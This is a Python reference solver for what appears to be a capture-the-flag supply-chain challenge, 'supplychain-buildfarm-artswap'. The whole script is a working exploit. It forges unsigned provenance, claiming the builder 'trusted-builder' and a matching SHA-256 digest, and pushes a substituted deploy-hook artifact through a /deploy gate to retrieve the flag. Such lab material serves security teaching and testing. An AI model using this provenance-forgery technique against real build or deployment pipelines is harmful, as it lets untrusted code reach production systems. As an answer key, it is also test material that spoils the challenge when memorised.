#!/usr/bin/env python3
"""Reference solver for supplychain-buildfarm-artswap.

Provenance is self-attested (no signature): the gate only checks builder ==
trusted-builder and digest == sha256(artifact). Swap in the deploy-hook artifact
and forge matching provenance.

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.request
from hashlib import sha256


def _req(url, obj=None, method="GET"):
    data = json.dumps(obj).encode() if obj is not None else None
    headers = {"Content-Type": "application/json"} if data else {}
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    return json.loads(urllib.request.urlopen(req, timeout=10).read())


def solve(base):
    base = base.rstrip("/")
    artifact = "on-deploy: emit-flag"
    prov = {
        "builder": "trusted-builder",
        "digest": sha256(artifact.encode()).hexdigest(),
    }
    out = _req(base + "/deploy", {"artifact": artifact, "provenance": prov}, "POST")
    return out["deploy_output"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
